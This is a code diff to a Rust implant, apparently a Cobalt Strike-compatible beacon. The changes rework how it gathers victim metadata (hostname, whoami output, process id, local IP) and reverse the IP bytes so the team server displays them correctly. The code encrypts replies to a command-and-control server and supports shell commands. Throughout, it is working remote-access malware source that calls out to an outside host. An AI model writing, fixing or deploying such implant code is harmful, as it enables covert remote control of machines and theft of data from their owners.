@@ -24,13 +24,16 @@ use crypto::{
     symmetriccipher,
 };
 use std::io::Cursor;
+use local_ip_address::local_ip;
+use crypt::*;
+use profile::{C2_GET_URL, C2_POST_URL, PUB_KEY, USER_AGENT};
+use utils::*;
+
 
 mod crypt;
 mod profile;
 mod utils;
-use crypt::*;
-use profile::{C2_GET_URL, C2_POST_URL, PUB_KEY, USER_AGENT};
-use utils::*;
+
 
 const CMD_TYPE_SLEEP: u32 = 4;
 const CMD_TYPE_SHELL: u32 = 78; //0x4E
@@ -166,6 +169,7 @@ impl Beacon {
 
     fn windows_collect_info(&self) -> Result<String> {
         let process_id = std::process::id();
+        let port = 0u16;
         let metadata_flag = 0u8;
         let os_version = win_os_system("ver").unwrap_or("unknow_version".into());
         let mut os_version_maj: u8 = 0;
@@ -195,20 +199,29 @@ impl Beacon {
         };
         let host_name = win_os_system("hostname").unwrap_or("unknow_hostname".into());
         let user_name = win_os_system("whoami").unwrap_or("unknow_name".into());
-        let local_ip = match Self::get_local_ipv4() {
-            Some(local_ip) => local_ip,
-            None => {
-                eprintln!("Failed to get local IPv4 address");
-                Ipv4Addr::new(127, 0, 0, 1)
+        let local_ip = match local_ip() {
+            Ok(ip) => {
+                println!("本机的内网 IP 地址是: {:?}", ip);
+                ip
+            },
+            Err(e) => {
+                eprintln!("无法获取内网 IP 地址: {}", e);
+                IpAddr::V4(Ipv4Addr::new(127, 0, 0, 1))
             }
         };
-        println!("local_ip: {}", local_ip);
+        let mut ip_bytes = match local_ip {
+            IpAddr::V4(ipv4) => ipv4.octets().to_vec(),
+            IpAddr::V6(ipv6) => ipv6.octets().to_vec(),
+        };
+        //进行反转--要不然cs不能正常显示
+        ip_bytes.reverse();
         let os_info = format!("{}\t{}\t{}", &host_name, &user_name, &process_name).into_bytes();
         let locale_ansi = 936u16;
         let locale_oem = 936u16;
         let online_info = [
             &self.id.to_be_bytes()[..],
             &process_id.to_be_bytes()[..],
+            &port.to_be_bytes()[..],
             &metadata_flag.to_be_bytes()[..],
             &os_version_maj.to_be_bytes()[..],
             &os_version_min.to_be_bytes()[..],
@@ -216,7 +229,7 @@ impl Beacon {
             &ptr_func_addr.to_be_bytes()[..],
             &ptr_gmh_func_addr.to_be_bytes()[..],
             &ptr_gpa_func_addr.to_be_bytes()[..],
-            &u32::from(local_ip).to_be_bytes()[..],
+            &ip_bytes[..],
             &os_info,
         ]
         .concat();
@@ -242,16 +255,6 @@ impl Beacon {
         Ok(pkg)
     }
 
-    fn get_local_ipv4() -> Option<Ipv4Addr> {
-        let socket = SocketAddr::from(([0, 0, 0, 0], 0));
-        match socket.ip() {
-            IpAddr::V4(ipv4) => Some(ipv4),
-            IpAddr::V6(_) => {
-                eprintln!("Only IPv4 addresses are supported");
-                None
-            }
-        }
-    }
 }
 
 fn main() {
@@ -263,7 +266,7 @@ fn main() {
         Some("macOS") => beacon.linux_collect_info(),
         _ => beacon.linux_collect_info(),
     }
-    .unwrap_or_else(|_| panic!("collect info error"));
+        .unwrap_or_else(|_| panic!("collect info error"));
     let mut counter = 1u32;
     println!("starting connect to {}", C2_GET_URL);
     loop {
@@ -310,7 +313,7 @@ fn main() {
                         &counter.to_be_bytes()[..],
                         &(output.len() as u32 + 4).to_be_bytes()[..],
                         &reply_type.to_be_bytes()[..],
-                        &output.as_bytes(),
+                        &output.as_bytes()[..],
                     ]
                     .concat();
                     counter += 1;
@@ -368,7 +371,7 @@ fn reply_pkg(data: &[u8]) -> Vec<u8> {
         &reply_type.to_be_bytes()[..],
         &data,
     ]
-    .concat();
+        .concat();
     let raw_pkg_encrypted = aes_encrypt(&raw_pkg.as_slice(), aes_key, iv).unwrap();
     let hash = hmac_hash(hmac_key, raw_pkg_encrypted.as_slice());
     let buf = [
